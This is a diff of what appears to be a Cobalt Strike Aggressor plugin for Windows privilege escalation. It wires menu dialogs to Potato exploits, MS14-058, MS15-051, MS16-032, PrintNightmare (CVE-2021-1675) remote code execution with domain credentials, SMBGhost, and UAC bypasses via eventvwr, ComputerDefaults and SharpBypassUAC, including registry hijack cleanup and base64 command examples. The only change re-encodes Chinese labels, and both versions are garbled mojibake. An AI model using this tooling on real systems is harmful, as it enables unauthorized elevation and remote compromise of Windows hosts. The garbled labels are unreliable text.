@@ -50,13 +50,13 @@ sub ComputerDefaults_uac_command{
     $command1 = "reg delete \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /f";
     bshell($3['bid'], $command1);
 }
-menu "È¨ÏŞÌáÉı" {
+menu "æƒé™æå‡" {
 
-item "Watson(»ñÈ¡¿ÉÌáÈ¨Â©¶´)" {
+item "Watson(è·å–å¯ææƒæ¼æ´)" {
         $bid = $1;
         $dialog = dialog("Watson", %(bid => $bid), &Watson);
-        dialog_description($dialog, "»ñÈ¡¿ÉÓÃÓÚÌáÈ¨µÄÂ©¶´¡£Ö§³ÖWindows 10 1507¡¢1511¡¢1607¡¢1703¡¢1709¡¢1803¡¢1809¡¢1903¡¢1909¡¢2004¡¢Server 2016ºÍ2019¡£ÏîÄ¿µØÖ·£ºhttps://github.com/rasta-mouse/Watson");
-    dbutton_action($dialog, "ÔËĞĞ");
+        dialog_description($dialog, "è·å–å¯ç”¨äºææƒçš„æ¼æ´ã€‚æ”¯æŒWindows 10 1507ã€1511ã€1607ã€1703ã€1709ã€1803ã€1809ã€1903ã€1909ã€2004ã€Server 2016å’Œ2019ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/rasta-mouse/Watson");
+    dbutton_action($dialog, "è¿è¡Œ");
         dialog_show($dialog);
   }
   sub Watson {
@@ -68,7 +68,7 @@ item "Watson(»ñÈ¡¿ÉÌáÈ¨Â©¶´)" {
     $Dialog = dialog("Sweet Potato",%(bid => $bid),&SweetPotato);
     dialog_description($Dialog, "MS16-075");
     drow_listener($Dialog, "listener", "Listener: ");
-    dbutton_action($Dialog, "ÔËĞĞ");
+    dbutton_action($Dialog, "è¿è¡Œ");
     dialog_show($Dialog);
   }
   sub SweetPotato {
@@ -92,7 +92,7 @@ item "Watson(»ñÈ¡¿ÉÌáÈ¨Â©¶´)" {
     $Dialog = dialog("juicypotato",%(bid => $bid),&juicypotato);
     dialog_description($Dialog, "juicypotato(ms16-075)");
     drow_listener($Dialog, "listener", "Listener: ");
-    dbutton_action($Dialog, "ÔËĞĞ");
+    dbutton_action($Dialog, "è¿è¡Œ");
     dialog_show($Dialog);
   }
   sub juicypotato {
@@ -114,7 +114,7 @@ item "MS14-058"{
     $Dialog = dialog("MS14-058",%(bid => $bid),&ms14_058_exploit);
     dialog_description($Dialog, "MS14-058");
     drow_listener($Dialog, "listener", "Listener: ");
-    dbutton_action($Dialog, "ÔËĞĞ");
+    dbutton_action($Dialog, "è¿è¡Œ");
     dialog_show($Dialog);
   }
   sub ms14_058_exploit {
@@ -137,7 +137,7 @@ item "MS14-058"{
     $Dialog = dialog("MS15-051",%(bid => $bid),&ms15_051_exploit);
     dialog_description($Dialog, "MS15-051");
     drow_listener($Dialog, "listener", "Listener: ");
-    dbutton_action($Dialog, "ÔËĞĞ");
+    dbutton_action($Dialog, "è¿è¡Œ");
     dialog_show($Dialog);
   }
   sub ms15_051_exploit {
@@ -164,7 +164,7 @@ item "MS14-058"{
     $Dialog = dialog("MS16-016",%(bid => $bid),&ms16_016_exploit);
     dialog_description($Dialog, "MS16-016");
     drow_listener($Dialog, "listener", "Listener: ");
-    dbutton_action($Dialog, "ÔËĞĞ");
+    dbutton_action($Dialog, "è¿è¡Œ");
     dialog_show($Dialog);
   }
   sub ms16_016_exploit {
@@ -184,7 +184,7 @@ item "MS14-058"{
     $Dialog = dialog("MS16-032",%(bid => $bid),&ms16_032_exploit);
     dialog_description($Dialog, "MS16-032");
     drow_listener($Dialog, "listener", "Listener: ");
-    dbutton_action($Dialog, "ÔËĞĞ");
+    dbutton_action($Dialog, "è¿è¡Œ");
     dialog_show($Dialog);
   }
   sub ms16_032_exploit {
@@ -203,7 +203,7 @@ item "MS14-058"{
     $Dialog = dialog("MS16-135",%(bid => $bid),&ms16_135_exploit);
     dialog_description($Dialog, "MS16-135");
     drow_listener($Dialog, "listener", "Listener: ");
-    dbutton_action($Dialog, "ÔËĞĞ");
+    dbutton_action($Dialog, "è¿è¡Œ");
     dialog_show($Dialog);
   }
   sub ms16_135_exploit {
@@ -224,7 +224,7 @@ item "MS14-058"{
     $Dialog = dialog("CVE-2021-1675",%(bid => $bid, version => "4.5",dll => "C:\\test.dll"),&cve_2021_1675_local_exploit);
     dialog_description($Dialog, "Windows Spooler Service,Load any dll with System permissions");
     drow_text($Dialog,"dll","DllPath");
-    drow_combobox($Dialog,"version",".NET°æ±¾:",@("3.5","4.5"));
+    drow_combobox($Dialog,"version",".NETç‰ˆæœ¬:",@("3.5","4.5"));
     dbutton_action($Dialog, "Exploit");
     dialog_show($Dialog);
   }
@@ -246,8 +246,8 @@ item "MS14-058"{
     $Dialog = dialog("CVE-2021-1675",%(bid => $bid, version => "4.5",dll_uac_path => "\\\\127.0.0.1\\smb\\test.dll", target => "\\\\127.0.0.2"),&RCE_BY_CURRENT_USER);
     dialog_description($Dialog, "Windows Spooler Service,RCE BY CURRENT USER");
     drow_text($Dialog,"dll_uac_path","DllPath");
-    drow_text($Dialog,"target","Ä¿±êip");
-    drow_combobox($Dialog,"version",".NET°æ±¾:",@("3.5","4.5"));
+    drow_text($Dialog,"target","ç›®æ ‡ip");
+    drow_combobox($Dialog,"version",".NETç‰ˆæœ¬:",@("3.5","4.5"));
     dbutton_action($Dialog, "Exploit");
     dialog_show($Dialog);
   }
@@ -270,11 +270,11 @@ item "MS14-058"{
     $Dialog = dialog("CVE-2021-1675",%(bid => $bid, version => "4.5",dll_uac_path => "\\\\127.0.0.1\\smb\\test.dll", target => "\\\\127.0.0.2", Domain => "Test.com", user => "User", pass => "Pass"),&RCE_BY_Runas);
     dialog_description($Dialog, "Windows Spooler Service,RCE BY  Runas");
     drow_text($Dialog,"dll_uac_path","DllPath");
-    drow_text($Dialog,"target","Ä¿±êip:");
-    drow_text($Dialog,"Domain","ÓòÃû:");
+    drow_text($Dialog,"target","ç›®æ ‡ip:");
+    drow_text($Dialog,"Domain","åŸŸå:");
     drow_text($Dialog,"user","User:");
     drow_text($Dialog,"pass","Pass:");
-    drow_combobox($Dialog,"version",".NET°æ±¾:",@("3.5","4.5"));
+    drow_combobox($Dialog,"version",".NETç‰ˆæœ¬:",@("3.5","4.5"));
     dbutton_action($Dialog, "Exploit");
     dialog_show($Dialog);
 
@@ -301,7 +301,7 @@ item "MS14-058"{
     $Dialog = dialog("cve_2020_0796_exploit",%(bid => $bid),&cve_2020_0796_exploit);
     dialog_description($Dialog, "Windows 10 versions 1903 - 1909");
     drow_listener($Dialog, "listener", "Listener: ");
-    dbutton_action($Dialog, "ÔËĞĞ");
+    dbutton_action($Dialog, "è¿è¡Œ");
     dialog_show($Dialog);
   }
   sub cve_2020_0796_exploit {
@@ -336,7 +336,7 @@ menu "Bypass_uac" {
      menu "Eventvwr_uac(Win7)" {
         item "Eventvwr_for_powershell" {
         $dialog = dialog("BypassUac for eventvwr",%(bid => $1['@']),&eventvwr_uac);
-        dialog_description($dialog,"Í¨¹ı eventvwr Bypass uac(Êµ¼Ê²âÊÔÓòÓÃ»§²»¿ÉÒÔÌáÉı,Éú³ÉµÄpowershell²»ÃâÉ±,ÊÊÓÃÓÚÎŞav)");
+        dialog_description($dialog,"é€šè¿‡ eventvwr Bypass uac(å®é™…æµ‹è¯•åŸŸç”¨æˆ·ä¸å¯ä»¥æå‡,ç”Ÿæˆçš„powershellä¸å…æ€,é€‚ç”¨äºæ— av)");
         drow_listener($dialog,"listener","Listener: ");
         dbutton_action($dialog,"Exploits");
         dialog_show($dialog);
@@ -345,7 +345,7 @@ menu "Bypass_uac" {
         separator();
         item "Eventvwr_for_command" {
         $dialog = dialog("BypassUac for eventvwr",%(bid => $1['@'] , command => "C:\\Temp\\payload.exe"),&eventvwr_uac_command);
-        dialog_description($dialog,"Í¨¹ı eventvwr Bypass uac(Ö´ĞĞÃüÁî,¿É²Ù×÷ĞÔ¸üÇ¿,×Ô¼º´¦ÀíÃâÉ±²¿·ÖÏ¸½Ú,»¹¿ÉÒÔÀûÓÃWindows apiº¯ÊıĞŞ¸Ä×¢²á±í¸ü¼ÓÒş±Î)");
+        dialog_description($dialog,"é€šè¿‡ eventvwr Bypass uac(æ‰§è¡Œå‘½ä»¤,å¯æ“ä½œæ€§æ›´å¼º,è‡ªå·±å¤„ç†å…æ€éƒ¨åˆ†ç»†èŠ‚,è¿˜å¯ä»¥åˆ©ç”¨Windows apiå‡½æ•°ä¿®æ”¹æ³¨å†Œè¡¨æ›´åŠ éšè”½)");
         drow_text($dialog,"command","Payload:");
         dbutton_action($dialog,"Exploits");
         dialog_show($dialog);
@@ -356,7 +356,7 @@ menu "Bypass_uac" {
         menu "ComputerDefaults(Win10)" {
         item "ComputerDefaults_for_powershell" {
         $dialog = dialog("BypassUac for ComputerDefaults",%(bid => $1['@']),&ComputerDefaults);
-        dialog_description($dialog,"Í¨¹ı ComputerDefaults Bypass uac(Êµ¼Ê²âÊÔÓòÓÃ»§²»¿ÉÒÔÌáÉı,Éú³ÉµÄpowershell²»ÃâÉ±,ÊÊÓÃÓÚÎŞav)");
+        dialog_description($dialog,"é€šè¿‡ ComputerDefaults Bypass uac(å®é™…æµ‹è¯•åŸŸç”¨æˆ·ä¸å¯ä»¥æå‡,ç”Ÿæˆçš„powershellä¸å…æ€,é€‚ç”¨äºæ— av)");
         drow_listener($dialog,"listener","Listener: ");
         dbutton_action($dialog,"Exploits");
         dialog_show($dialog);
@@ -365,7 +365,7 @@ menu "Bypass_uac" {
         separator();
         item "ComputerDefaults_for_command" {
         $dialog = dialog("BypassUac for ComputerDefaults",%(bid => $1['@'] , command => "C:\\Temp\\payload.exe"),&ComputerDefaults_uac_command);
-        dialog_description($dialog,"Í¨¹ı ComputerDefaults Bypass uac(Ö´ĞĞÃüÁî,¿É²Ù×÷ĞÔ¸üÇ¿,×Ô¼º´¦ÀíÃâÉ±²¿·ÖÏ¸½Ú,»¹¿ÉÒÔÀûÓÃWindows apiº¯ÊıĞŞ¸Ä×¢²á±í¸ü¼ÓÒş±Î)");
+        dialog_description($dialog,"é€šè¿‡ ComputerDefaults Bypass uac(æ‰§è¡Œå‘½ä»¤,å¯æ“ä½œæ€§æ›´å¼º,è‡ªå·±å¤„ç†å…æ€éƒ¨åˆ†ç»†èŠ‚,è¿˜å¯ä»¥åˆ©ç”¨Windows apiå‡½æ•°ä¿®æ”¹æ³¨å†Œè¡¨æ›´åŠ éšè”½)");
         drow_text($dialog,"command","Payload:");
         dbutton_action($dialog,"Exploits");
         dialog_show($dialog);
@@ -375,10 +375,10 @@ menu "Bypass_uac" {
         item "SharpBypassUAC"{
         $bid = $1;
         $dialog = dialog("BypassUAC", %(cmd => "VALUE Base64 encoded command to execute",type => "eventvwr",bid => $bid), &BypassUAC);
-        dialog_description($dialog, "ÃüÁîĞè½øĞĞbase64±àÂë,Èç:Y21kIC9jIHN0YXJ0IGNhbGMuZXhl,dikcleanupµÄÃüÁî±ØĞëÒÔ' && REM'½áÎ²,Èç:Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ ==,icmluaµÄÃüÁî¸ñÊ½Îª /c xx,ÀıÈç:L2MgY21kLmV4ZQ==¡£ÏîÄ¿µØÖ·£ºhttps://github.com/FatRodzianko/SharpBypassUAC");
+        dialog_description($dialog, "å‘½ä»¤éœ€è¿›è¡Œbase64ç¼–ç ,å¦‚:Y21kIC9jIHN0YXJ0IGNhbGMuZXhl,dikcleanupçš„å‘½ä»¤å¿…é¡»ä»¥' && REM'ç»“å°¾,å¦‚:Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ ==,icmluaçš„å‘½ä»¤æ ¼å¼ä¸º /c xx,ä¾‹å¦‚:L2MgY21kLmV4ZQ==ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/FatRodzianko/SharpBypassUAC");
         drow_text($dialog, "cmd", "command:  ");
         drow_combobox($dialog, "type", "type:", @("eventvwr", "fodhelper","computerdefaults","sdclt","slui","dikcleanup","icmlua"));
-        dbutton_action($dialog, "ÔËĞĞ");
+        dbutton_action($dialog, "è¿è¡Œ");
         dialog_show($dialog);
   }
   sub BypassUAC {
